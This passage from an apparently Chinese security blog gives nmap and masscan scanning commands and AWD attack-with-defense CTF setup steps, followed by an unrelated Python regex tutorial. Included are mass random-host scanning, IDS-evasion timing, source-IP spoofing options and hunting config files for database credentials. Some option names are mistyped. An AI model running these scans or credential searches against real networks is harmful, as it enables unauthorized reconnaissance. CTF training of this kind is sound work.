和操作系统检测，这个扫描需要有根权限。</p><p>nmap -sV -p 22，53，110，143，4564 198.116.0-255.1-127</p><p>进行主机列举和TCP扫描，对象为B类198.116网段中255个8位子网。这 个测试用于确定系统是否运行了sshd、DNS、imapd或4564端口。如果这些端口 打开，将使用版本检测来确定哪种应用在运行。(-sV)</p><p>nmap -v -iR 100000 -P0 -p 80</p><p>随机选择100000台主机扫描是否运行Web服务器(80端口)。由起始阶段发送探测报文来确定主机是否工作非常浪费时间，而且只需探测主机的一个端口，因此使用-P0禁止对主机列表。</p><p>nmap -P0 -p80 -oX logs/pb-port80scan.xml -oG logs/pb-port80scan.gnmap 216.163.128.20/20</p><p>扫描4096个IP地址，查找Web服务器(不ping)，将结果以Grep和XML格式保存。</p><p>host -l company.com | cut -d -f 4 | nmap -v -iL -</p><p>进行DNS区域传输，以发现company.com中的主机，然后将IP地址提供给 Nmap。上述命令用于GNU/Linux – 其它系统进行区域传输时有不同的命令。</p><h4 id="深入扫描命令"><a href="#深入扫描命令" class="headerlink" title="深入扫描命令"></a>深入扫描命令</h4><p>-Pn  不探测扫描（假定所有主机都存活）</p><p>-PB  默认探测扫描（探测端口：TCP 80，445&amp;ICMP）</p><p>-PS  &lt;portlist&gt;  tcp探测扫描</p><p>-PE  ICMP Echo Request</p><p>-PP  ICMP Timestamp Request</p><p>-PM  ICMP Netmask Request</p><h4 id="扫描类型"><a href="#扫描类型" class="headerlink" title="扫描类型"></a>扫描类型</h4><p>-sP  只探测主机在线情况</p><p>-sS  SYN扫描（隐身扫描）</p><p>-ST  TCP扫描</p><p>-sU  UDP扫描</p><p>-sV  系统版本检测</p><p>-O   操作系统识别</p><p>–scanflags  指定TCP标识位（设置URG, ACK, PSH,RST,SYN,FIN位）</p><h4 id="细粒度的时间选项"><a href="#细粒度的时间选项" class="headerlink" title="细粒度的时间选项"></a>细粒度的时间选项</h4><p>–min-hostgroup/max-hostgroup <size>  平行的主机扫描组的大小</size></p><p>–min-parallelism/max-parallelism <numprobes>  并行探测</numprobes></p><p>–min-rtt-timeout/max-rtttimeout/initial-rtt-timeout <time>   指定每轮探测的时间</time></p><p>–max-retries <tries>    扫描探测的上限次数设定</tries></p><p>–host-timeout <time>    设置timeout时间</time></p><p>–scan-delay/–max-scan-delay <time>  调整两次探测之间的延迟</time></p><p>–min-rate <number>     每秒发送数据包不少于<number>次</number></number></p><h4 id="时序选项"><a href="#时序选项" class="headerlink" title="时序选项"></a>时序选项</h4><p>-T0  偏执的：非常非常慢，用于IDS逃逸</p><p>-T1  猥琐的：相当慢，用于IDS逃逸</p><p>-T2  有礼貌的：降低速度以消耗更小的带宽，比默认慢十倍</p><p>-T3  普通的：默认，根据目标的反应自动调整时间模式</p><p>-T4  野蛮的：假定处在一个很好的网络环境，请求可能会淹没目标</p><p>-T5  疯狂的：非常野蛮，很可能会淹没目标端口或是漏掉一些开放端口</p><h4 id="misc选项"><a href="#misc选项" class="headerlink" title="misc选项"></a>misc选项</h4><p>-n  禁止反向IP地址查找</p><p>-6  只是用 IPv6</p><p>-A  是用几个命令：OS 探测，版本探测，脚本扫描，traceroute</p><p>–reason 列出nmap的判断：端口开放，关闭，被过滤。</p><h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>-oN  标准输出</p><p>-oG  好理解的格式</p><p>-ox  xml格式</p><p>-oA&lt;basename&gt;  用&lt;basename&gt;生成以上格式的文件 </p><h3 id="线下AWD必须用好的nmap指令"><a href="#线下AWD必须用好的nmap指令" class="headerlink" title="线下AWD必须用好的nmap指令"></a>线下AWD必须用好的nmap指令</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.9</span> 使用nmap扫描主机</span><br><span class="line"><span class="comment">//  http://nmap.org/book/</span></span><br><span class="line">#nmap --version  <span class="comment">// -V -h</span></span><br><span class="line">#man nmap</span><br><span class="line"></span><br><span class="line">#nmap -vv -vv参数设置对结果的详细输出</span><br><span class="line">#nmap -sS -Pn -A host隐身、操作系统信息和路由跟踪、-P0和-Pn两个选项的效果是一样的，就是不进行主机发现，而直接进行更深层次的扫描，如服务版本扫描或系统类型扫描。-Pn  不探测扫描（假定所有主机都存活）</span><br><span class="line"></span><br><span class="line">#nmap -A -T4 scanme.nmap.org</span><br><span class="line"><span class="comment">// -A:to enable OS and version detection, script scanning,and traceroute;</span></span><br><span class="line"><span class="comment">// -T4:faster execution加快执行速度</span></span><br><span class="line"></span><br><span class="line">#nmap localhost</span><br><span class="line"><span class="comment">// #netstat -apn | grep 8080 ===&gt; port 8080 process</span></span><br><span class="line"></span><br><span class="line">*多机快速扫描</span><br><span class="line">#nmap -vv -sP <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span>-sP是使用ICMP协议发送echo请求数据包，但是很容易被防火墙过滤掉。</span><br><span class="line"></span><br><span class="line"><span class="comment">// ==&gt;在线主机</span></span><br><span class="line">#nmap -vv -sP <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'report for.*[<span class="number">0</span><span class="number">-9</span>]$'</span><br><span class="line">#nmap -v -n -sP --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ==&gt;在线主机:端口开放  -n 禁止反向IP地址查找</span></span><br><span class="line">#nmap -v -n -sS -Pn -p22 --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">#nmap -v -n -sS -Pn -p21，<span class="number">22</span>，<span class="number">80</span>，<span class="number">8080</span>，<span class="number">3306</span> --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">#nmap -v -n -sS -Pn -p1<span class="number">-1024</span> --max-rtt-timeout <span class="number">500</span>ms <span class="number">192.168</span><span class="number">.102</span><span class="number">.1</span><span class="number">-254</span> | grep 'open'</span><br><span class="line">--max-rtt-timeout调整探测报文超时</span><br><span class="line"></span><br><span class="line">&gt; results.txt重定向发送到文件</span><br></pre></td></tr></table></figure><h3 id="番外AWD"><a href="#番外AWD" class="headerlink" title="番外AWD"></a>番外AWD</h3><p>附上AWD基操</p><h4 id="1、确定环境是密码登录还是密钥登录"><a href="#1、确定环境是密码登录还是密钥登录" class="headerlink" title="1、确定环境是密码登录还是密钥登录"></a>1、确定环境是密码登录还是密钥登录</h4><p>密钥登录：（比赛方会提供如下三个文件）</p><p>id_rsa</p><p>id_rsa.pub</p><p>token.txt</p><p>文件导入即可</p><p>若为密码登录，则看密码是否为随机的哈希值，并推测全场密码是否一样，若一样则首先需要修改密码，避免对方写批量遍历脚本，遍历所有服务器，当可以登录时，就瞬间修改你的机子，然后你就什么都做不了，服务器都落到对方手中，除非重置机子。</p><p>修改密码：passwd 用户名    //linux命令</p><p>​                    passwd ubuntu sudo passwd root   //ubuntu命令： </p><p>​                    w   //查看当前登录的用户 </p><p>​                    kill -kill -t 用户的tty   //踢掉当前登录的用户</p><h4 id="2、迅速备份源码和数据库到本机"><a href="#2、迅速备份源码和数据库到本机" class="headerlink" title="2、迅速备份源码和数据库到本机"></a>2、迅速备份源码和数据库到本机</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/<span class="regexp">/这里假定web目录为/var</span><span class="regexp">/www/html</span></span><br><span class="line">mkdir -p ~<span class="regexp">/beifen</span></span><br><span class="line"><span class="regexp">cp -ra /var</span><span class="regexp">/www/html</span><span class="regexp">/. ~/beifen</span></span><br><span class="line">其中~代表用户的家目录，-r是递归，-a是保留原来文件属性， .是代表所有文件（不用*，因为*无法表示所有文件）</span><br></pre></td></tr></table></figure><p>定时备份源码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">while</span> [ 1 ]</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">time=`/bin/date +%H-%M-%S`</span><br><span class="line">bak_file=<span class="string">"/var/www/<span class="variable">$time</span>.tar.gz"</span></span><br><span class="line">webdir=<span class="string">"/var/www/html"</span></span><br><span class="line">tar zcvf <span class="variable">$bak_file</span> <span class="variable">$webdir</span> &gt;/dev/null 2&gt;&amp;1 &amp;</span><br><span class="line">sleep 60                               //一分钟备份一次</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h4 id="3、找配置文件-amp-mysql一些操作"><a href="#3、找配置文件-amp-mysql一些操作" class="headerlink" title="3、找配置文件&amp;mysql一些操作"></a>3、找配置文件&amp;mysql一些操作</h4><p>找配置文件，找文件名有con、config、db字样的。在刚才备份的文件那里可以使用linux命令</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">find</span> . -<span class="built_in">name</span> <span class="string">'*name*'</span></span><br></pre></td></tr></table></figure><p>找到这些文件后，最主要找一些账号密码，例如mysql账号密码，如果找到了，自己可以修改自己服务器上的mysql密码，命令如下：（先自己登陆进去）</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update<span class="built_in"> user </span><span class="builtin-name">set</span> <span class="attribute">password</span>=PASSWORD("新的密码") where <span class="attribute">user</span>=<span class="string">'root'</span>; </span><br><span class="line">mysql&gt; flush privileges; (刷新)</span><br><span class="line">mysql&gt; exit</span><br></pre></td></tr></table></figure><p>记得修改了mysql密码后，还要把刚才找到的配置文件的密码给修改了，不然你的web服务就会不正常。</p><p>得到mysql密码，一般来说你就可以看看你自己mysql数据库里的数据，一般来说别人的数据库记录也是如此，所以别人一些后台账号密码，你都可以找到的（如果里面入库是不经过哈希处理的）</p><p>另外，也多注意有什么别的配置文件。</p><p>备份数据库</p><p>​        </p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//mysql备份指定数据库 </span></span><br><span class="line">mysqldump -u 用户名 -<span class="selector-tag">p</span> 密码 数据库名 &gt; back<span class="selector-class">.sql</span> </span><br><span class="line"><span class="comment">//mysql备份所有数据库 </span></span><br><span class="line">mysqldump --all-databases &gt; bak<span class="selector-class">.sql</span> </span><br><span class="line"><span class="comment">//还原mysql数据库 </span></span><br><span class="line">mysql -u 用户名 -<span class="selector-tag">p</span> 密码 数据库名 &lt; bak.sql</span><br></pre></td></tr></table></figure><h4 id="4、嗅探主机（nmap）"><a href="#4、嗅探主机（nmap）" class="headerlink" title="4、嗅探主机（nmap）"></a>4、嗅探主机（nmap）</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ICMP扫描： nmap -sP <span class="number">192.168</span><span class="number">.150</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line">检测目标操作系统： -O</span><br><span class="line">SYN扫描  ： -sS</span><br><span class="line">操作系统版本检测： -sV</span><br><span class="line">nmap -sS -p <span class="number">1337</span> <span class="number">192.168</span><span class="number">.150</span><span class="number">.0</span>/<span class="number">24</span></span><br></pre></td></tr></table></figure><h4 id="5、嗅探主机-MASSCAN"><a href="#5、嗅探主机-MASSCAN" class="headerlink" title="5、嗅探主机(MASSCAN)"></a>5、嗅探主机(MASSCAN)</h4><p><strong>安装</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> sudo apt-get install clang git gcc make libpcap-dev</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> git <span class="built_in">clone</span> https://github.com/robertdavidgraham/masscan</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> masscan</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> make</span></span><br></pre></td></tr></table></figure><p><strong>单端口扫描</strong></p><p>扫描443端口的B类子网</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p443</span><br></pre></td></tr></table></figure><p><strong>多端口扫描</strong></p><p>扫描80或443端口的B类子网</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p80,<span class="number">443</span></span><br></pre></td></tr></table></figure><p><strong>扫描一系列端口</strong></p><p>扫描22到25端口的B类子网</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span> -p22<span class="number">-25</span></span><br></pre></td></tr></table></figure><p><strong>快速扫描</strong></p><p>使用如上的的设置可以得到结果，但速度将是比较慢。正如已经讨论的那样，整体上masscan要快一点，所以让我们加快速度。</p><p>默认情况下，Masscan扫描速度为每秒100个数据包，这是相当慢的。为了增加这一点，只需提供该-rate选项并指定一个值。</p><p>扫描100个常见端口的B类子网，每秒100,000个数据包</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> -rate <span class="number">100000</span></span><br></pre></td></tr></table></figure><p>你可以扫描的速度取决于很多因素，包括您的操作系统（Linux扫描扫描远远快于Windows），系统的资源，最重要的是您的带宽。为了以高速扫描非常大的网络，您需要使用百万以上的速率（-rate 1000000）。</p><p><strong>排除目标</strong></p><p>因为大部分的互联网可以很好地进行扫描，也可能只是出于纯粹的礼貌 – 你可能想要或需要从扫描中排除一些目标。为此，请提供–excludefile交换机以及包含要避免的范围列表的文件的名称。</p><p>扫描B类子网，但避免在exclude.txt中的</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> --excludefile exclude.txt</span><br></pre></td></tr></table></figure><p><strong>结果保存</strong></p><p>您可以使用标准的Unix重定向器将输出发送到文件：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Masscan <span class="number">10.11</span><span class="number">.0</span><span class="number">.0</span>/<span class="number">16</span>  --top-ports <span class="number">100</span> &gt; results.txt</span><br></pre></td></tr></table></figure><p> 除此之外，您还具有以下输出选项：</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-oX <span class="keyword">filename</span>：输出到<span class="keyword">filename</span>的XML。</span><br><span class="line">-oG <span class="keyword">filename</span>：输出到<span class="keyword">filename</span>的grepable格式。</span><br><span class="line">-oJ <span class="keyword">filename</span>：输出到<span class="keyword">filename</span>的JSON格式。</span><br></pre></td></tr></table></figure><p><strong>Nmap功能</strong></p><p>正如最初提到的，Masscan可以像nmap许多安全人员一样工作。这里有一些其他类似nmap的选项：</p><p>通过传递–nmap开关可以看到类似nmap的功能。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1. </span>-iL filename：从文件读取输入。</span><br><span class="line"><span class="bullet">2. </span>‐‐exclude host：在命令行中排除网络。</span><br><span class="line"><span class="bullet">3. </span>‐‐excludefile filename：从文件中排除网络。</span><br><span class="line"><span class="bullet">4. </span>-S：欺骗源IP。</span><br><span class="line"><span class="bullet">5. </span>-v interface：详细输出。</span><br><span class="line"><span class="bullet">6. </span>-vv interface：非常冗长的输出。</span><br><span class="line"><span class="bullet">7. </span>-e interface：使用指定的接口。</span><br><span class="line"><span class="bullet">8. </span>-e interface：使用指定的接口。</span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><hr><p><a href="https://www.cnblogs.com/machangwei-8/p/10353004.html" target="_blank" rel="noopener">https://www.cnblogs.com/machangwei-8/p/10353004.html</a></p><p><a href="https://www.cnblogs.com/zhaijiahui/p/8367327.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhaijiahui/p/8367327.html</a></p><p><a href="https://www.cnblogs.com/xdjun/p/9562030.html" target="_blank" rel="noopener">https://www.cnblogs.com/xdjun/p/9562030.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 工具小屋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Nmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python 之 正则</title>
      <link href="/2019/07/21/python%20%E6%AD%A3%E5%88%99/"/>
      <url>/2019/07/21/python%20%E6%AD%A3%E5%88%99/</url>
      
        <content type="html"><![CDATA[<h2 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h2><p>之前打CTF经常性的因为不会写脚本而去手撸，这大大降低了效率，而且有的题由于时间限制，显然手撸行不通。</p><p>而不会写脚本经常是因为自己不会处理得到的数据，如何过滤、拼接。所以今天学习一下python的re模块，正则替换，以及刚刚从Li4n0学长脚本中发现的字符表替换。</p><h3 id="正则"><a href="#正则" class="headerlink" title="正则"></a>正则</h3><h4 id="元字符"><a href="#元字符" class="headerlink" title="^元字符"></a>^元字符</h4><p>字符串开始位置与匹配规则符合就匹配，否则不匹配</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"^匹配规则"</span>,<span class="string">"匹配规则这个字符串是否匹配"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'匹配规则'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"^匹配规则"</span>,<span class="string">"匹配s规则这个字符串是否匹配"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><p>[^a-z]反取，</p><p>匹配出除字母外的字符，^元字符如果写到字符集里就是反取</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"[^a-z]"</span>, <span class="string">"匹配s规则这s个字符串是否s匹配f规则则re则则则"</span>)   <span class="comment">#反取，匹配出除字母外的字符</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'这'</span>, <span class="string">'个'</span>, <span class="string">'字'</span>, <span class="string">'符'</span>, <span class="string">'串'</span>, <span class="string">'是'</span>, <span class="string">'否'</span>, <span class="string">'匹'</span>, <span class="string">'配'</span>, <span class="string">'规'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>, <span class="string">'则'</span>]</span><br></pre></td></tr></table></figure><h4 id="元字符-1"><a href="#元字符-1" class="headerlink" title="$元字符"></a>$元字符</h4><p>字符串结束位置与匹配规则符合就匹配，否则不匹配</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt;import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;a = re.findall(<span class="string">"匹配规则$"</span>, <span class="string">"这个字符串是否匹配规则"</span>)   <span class="comment">#字符串结束位置与匹配规则符合就匹配，否则不匹配</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;print(a)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹配规则'</span>]</span><br></pre></td></tr></table></figure><h4 id="元字符-2"><a href="#元字符-2" class="headerlink" title="*元字符"></a>*元字符</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的*元字符）前面的一个字符可以是0个或多个原本字符</p><p>匹配前一个字符0或多次，贪婪匹配前导字符有多少个就匹配多少个很贪婪</p><p>如果规则里只有一个分组，尽量避免用*否则会有可能匹配出空字符串</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配规则*"</span>,<span class="string">"这个字符串是否匹配规则则则则则"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'匹配规则则则则则'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配规则*"</span>,<span class="string">"这个字符串是否匹配规"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[<span class="string">'匹配规'</span>]</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配规则*"</span>,<span class="string">"whether this string is matching?"</span>)</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)</span><br><span class="line">[]</span><br></pre></td></tr></table></figure><h4 id="元字符-3"><a href="#元字符-3" class="headerlink" title="+元字符"></a>+元字符</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的+元字符）前面的一个字符可以是1个或多个原本字符</p><p>匹配前一个字符1次或无限次，贪婪匹配前导字符有多少个就匹配多少个很贪婪</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配+"</span>, <span class="string">"匹配配配配配规则这个字符串是否匹配规则则则则则"</span>)   <span class="comment">#需要字符串里完全符合，匹配规则，就匹配，（规则里的+元字符）前面的一个字符可以是1个或多个原本字符</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹配配配配配'</span>, <span class="string">'匹配'</span>]</span><br></pre></td></tr></table></figure><h4 id="元字符，和防止贪婪匹配"><a href="#元字符，和防止贪婪匹配" class="headerlink" title="?元字符，和防止贪婪匹配"></a>?元字符，和防止贪婪匹配</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的?元字符）前面的一个字符可以是0个或1个原本字符</p><p>匹配一个字符0次或1次</p><p>还有一个功能是可以防止贪婪匹配，详情见防贪婪匹配</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配规则?"</span>, <span class="string">"匹配规这个字符串是否匹配规则则则则则"</span>)   <span class="comment">#需要字符串里完全符合，匹配规则，就匹配，（规则里的?元字符）前面的一个字符可以是0个或1个原本字符</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">[<span class="string">'匹配规'</span>, <span class="string">'匹配规则'</span>]</span><br></pre></td></tr></table></figure><h4 id><a href="#" class="headerlink" title=".*?"></a>.*?</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>line = <span class="string">'my title="sw engineer". His is "hello world"'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.search(<span class="string">r'title="(.*?)"'</span>, line)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m.group(<span class="number">1</span>)</span><br><span class="line">sw engineer</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 如果没有 ?， 则会抓到最长的两个双引号之间的内容</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = re.search(<span class="string">r'title="(.*)"'</span>, line)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">print</span> m.group(<span class="number">1</span>)</span><br><span class="line">sw enginee<span class="string">r". His is "</span>hello world</span><br></pre></td></tr></table></figure><h4 id="元字符-范围"><a href="#元字符-范围" class="headerlink" title="{}元字符,范围"></a>{}元字符,范围</h4><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的 {} 元字符）前面的一个字符，是自定义字符数，位数的原本字符</p><p>{m}匹配前一个字符m次，{m,n}匹配前一个字符m至n次，若省略n，则匹配m至无限次</p><p>{0,}匹配前一个字符0或多次,等同于*元字符<br>{+,}匹配前一个字符1次或无限次,等同于+元字符<br>{0,1}匹配前一个字符0次或1次,等同于?元字符</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt;import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;result = re.findall(<span class="string">"匹配规则&#123;3&#125;"</span>, <span class="string">"匹配规则这个字符串是否匹配规则则则则则"</span>)   <span class="comment">#&#123;m&#125;匹配前一个字符m次，&#123;m,n&#125;匹配前一个字符m至n次，若省略n，则匹配m至无限次</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt;print(result)  <span class="comment">#以列表形式返回匹配到的字符串</span></span><br><span class="line">打印出 [<span class="string">'匹配规则则则'</span>]</span><br></pre></td></tr></table></figure><h3 id="元字符-字符集"><a href="#元字符-字符集" class="headerlink" title="[]元字符,字符集"></a>[]元字符,字符集</h3><p>需要字符串里完全符合，匹配规则，就匹配，（规则里的 [] 元字符）对应位置是[]里的任意一个字符就匹配</p><p>字符集。对应的位置可以是字符集中任意字符。字符集中的字符可以逐个列出，也可以给出范围，如[abc]或[a-c]。[^abc]表示取反，即非abc。所有特殊字符在字符集中都失去其原有的特殊含义。用\反斜杠转义 <strong>恢复</strong> 特殊字符的特殊含义。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;</span>&gt; import re   <span class="comment">#第一步，要引入re模块</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; result = re.findall(<span class="string">"匹配[a,b,c]规则"</span>, <span 